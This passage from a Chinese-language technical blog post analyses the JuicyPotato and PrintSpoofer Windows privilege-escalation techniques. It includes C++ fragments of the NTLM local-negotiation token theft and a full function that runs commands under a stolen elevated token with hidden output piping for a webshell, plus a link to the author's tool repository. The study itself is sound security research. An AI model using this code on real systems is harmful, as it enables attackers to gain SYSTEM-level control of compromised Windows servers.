第一次调用`AcceptSecurityContext`，输入NTLM type1，输出NTLM type2。入参`secClientBufferDesc`，出参`secServerBufferDesc`，保存在`LocalNegotiator`的私有成员

`phContext`为新的security context句柄，有状态，第二次调用需要传递它

第一次调用成功返回值是**SEC_I_CONTINUE_NEEDED**（The function succeeded. The server must send the output token to the  client and wait for a returned token. The returned token should be  passed in *pInput* for another call to [AcceptSecurityContext (CredSSP)](https://docs.microsoft.com/windows/desktop/api/sspi/nf-sspi-acceptsecuritycontext).）

```c++
InitTokenContextBuffer(&secClientBufferDesc, &secClientBuffer);
InitTokenContextBuffer(&secServerBufferDesc, &secServerBuffer);

secClientBuffer.cbBuffer = static_cast<unsigned long>(len);
secClientBuffer.pvBuffer = ntlmBytes;

AcceptSecurityContext(
    &hCred,
    nullptr,
    &secClientBufferDesc,
    ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
    //STANDARD_CONTEXT_ATTRIBUTES,
    SECURITY_NATIVE_DREP,
    phContext,
    &secServerBufferDesc,
    &fContextAttr,
    &tsContextExpiry);
```

#### LocalNegotiator::handleType2

处理RPC发来的NTLM type2，将RPC响应中的NTLM type2修改为`AcceptSecurityContext`本地协商返回的type2，也就是修改server challenge和reserved

```c++
char* newNtlmBytes = (char*)secServerBuffer.pvBuffer;

if (len >= secServerBuffer.cbBuffer) {
    for (int i = 0; i < len; i++) {
        if (i < secServerBuffer.cbBuffer) {
            ntlmBytes[i] = newNtlmBytes[i];
        }
        else {
            ntlmBytes[i] = 0x00;
        }
    }
}
```

#### LocalNegotiator::handleType3

第二次调用`AcceptSecurityContext`，输入NTLM type3

完成整个协商过程，传入DCOM发来的response和第一次调用`AcceptSecurityContext`的`phContext`

```c++
AcceptSecurityContext(
    &hCred,
    phContext,
    &secClientBufferDesc,
    ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
    //STANDARD_CONTEXT_ATTRIBUTES,
    SECURITY_NATIVE_DREP,
    phContext,
    &secServerBufferDesc,
    &fContextAttr,
    &tsContextExpiry);
```

此时NTLM协商完成，`phContext`句柄已经是DCOM服务的security context

#### ImpersonateToken

后面没啥好说的了，调用`QuerySecurityContextToken`从security context中获取token

```c++
QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);
```

然后和前文一样调用`CreateProcessASUser/CreateProcessWithToken`创建进程

## Detailed question

通过学习基本掌握了所有细节，只有最后一个细节问题，如果有路过的大佬知道请发email告诉我 : )

JuicyPotato中，通过`CoGetInstanceFromIStorage`函数使rpcss服务激活指定的CLSID的COM服务，rpcss的OXID resolver会解析序列化的`IStorage`实例并请求OBJREF中指定`host[port]`，由此攻击者可以mitm，这是前提

但按我的理解，传递给`CoGetInstanceFromIStorage`的CLSID参数仅仅是告知rpcss激活哪个COM服务，而OXID resolve是由rpcss发出的，也就是说最终通过SSPI本地令牌协商拿到的令牌应该是rpcss的，和CLSID无关

但实际情况是，通过指定不同的CLSID，最终令牌权限也不同。比如Windows Server 2008 r2下，这个CLSID最终是当前登录用户的权限`{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}`

MSDN的解释也无法获知细节:

> Creates a new object and initializes it from a storage object through an internal call to [IPersistFile::Load](https://docs.microsoft.com/windows/desktop/api/objidl/nf-objidl-ipersistfile-load).

那么一个可能的解释是，如果指定BITS的CLSID，该函数先创建BITS对象，然后将`IStorage`参数传递给BITS服务让其自行解析，BITS服务调用rpcss的OXID resolver去解析OBJREF，rpcss会模拟client（例如调用`RpcImpersonateClient`），最终协商出的令牌权限也就是client的（存疑）

## WebShell Version

repo: https://github.com/EddieIvan01/win32api-practice

我实现了JuicyPotato和PrintSpoofer的WebShell版（T00ls上有JuicyPotato的WebShell版，但我没账号）

原理是设置子进程hide window，并通过父子进程间的匿名管道来获取子进程输出

```c++
BOOL CreateProcessWithOutput(HANDLE hToken) {
	BOOL result;
	DWORD SessionId;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	SECURITY_ATTRIBUTES sa = { 0 };

	sa.bInheritHandle = TRUE;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));

	DWORD sessionId = WTSGetActiveConsoleSessionId();

	HANDLE hReadPipe = NULL;
	HANDLE hWritePipe = NULL;

	result = CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);
	if (!result) {
		printf("\n[-] CreatePipe error: %d\n", GetLastError());
		return result;
	}

	si.cb = sizeof(si);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = (LPWSTR)L"winsta0\\default";

	fflush(stdout);
	wchar_t command[256];
	wcscpy_s(command, L"cmd.exe /c ");
	wcsncat_s(command, g_pwszCommandLine, wcslen(g_pwszCommandLine));

	LPWSTR pwszCurrentDirectory = (LPWSTR)malloc(sizeof(WCHAR) * 512);
	GetCurrentDirectoryW(512, pwszCurrentDirectory);
	if (!CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, command, 0, NULL, pwszCurrentDirectory, &si, &pi)) {
		wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
		goto CLEANUP;
	} else {
		wprintf(L"[+] CreateProcessWithTokenW() OK\n");
		goto RECV_OUTPUT;
	}

CLEANUP:
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	CloseHandle(hReadPipe);
	free(pwszCurrentDirectory);
	return result;

RECV_OUTPUT:
	const int dwResultBufferSize = 1024;
	// const DWORD timeout = 1000 * 10;
	char pszResultBuffer[dwResultBufferSize];

	// WaitForSingleObject(pi.hProcess, timeout);
	CloseHandle(hWritePipe);

	printf("\n====================CMD===================\n%ls\n", command);
	printf("\n==================OUTPUT==================\n");

	DWORD n = 0;
	do {
		RtlZeroMemory(pszResultBuffer, dwResultBufferSize);
		if (!ReadFile(hReadPipe, pszResultBuffer, dwResultBufferSize, &n, NULL)) break;
		printf("%s", pszResultBuffer);
		// if (pszResultBuffer[n] == EOF) break;
	} while (n);

	printf("\n==========================================");
	goto CLEANUP;
};
```

Windows的HANDLE本质是个有引用计数的智能指针。且管道的`read/write/close`机制和Go的buffered channel类似

写句柄引用计数不为0时，当管道内无数据可读，父进程会阻塞在`ReadFile`调用，起到了并发同步的作用，所以不需要`WaitForSingleObject`

父进程读管道前先关闭写句柄，目的是使当子进程执行完毕也关闭写句柄时，写句柄引用计数归零。此时调用`ReadFile`可以读出管道内未读的数据，读完后再次调用则会返回`n=0`而不会阻塞

另一个需要注意的点是，`ReadFile`获取的是`char*`而不是`wchar_t*`

踩的一个坑是，`CreateProcessAsUser`创建的子进程没有办法通过匿名管道拿到输出，命令执行完成后读取pipe还是会阻塞（无数据写入）

可以看到有人有同样的问题 https://bbs.csdn.net/topics/392036125

## Ref

+ https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
+ https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
+ https://bugs.chromium.org/p/project-zero/issues/detail?id=325&redir=1
+ https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/
+ https://codewhitesec.blogspot.com/2018/06/cve-2018-0624.html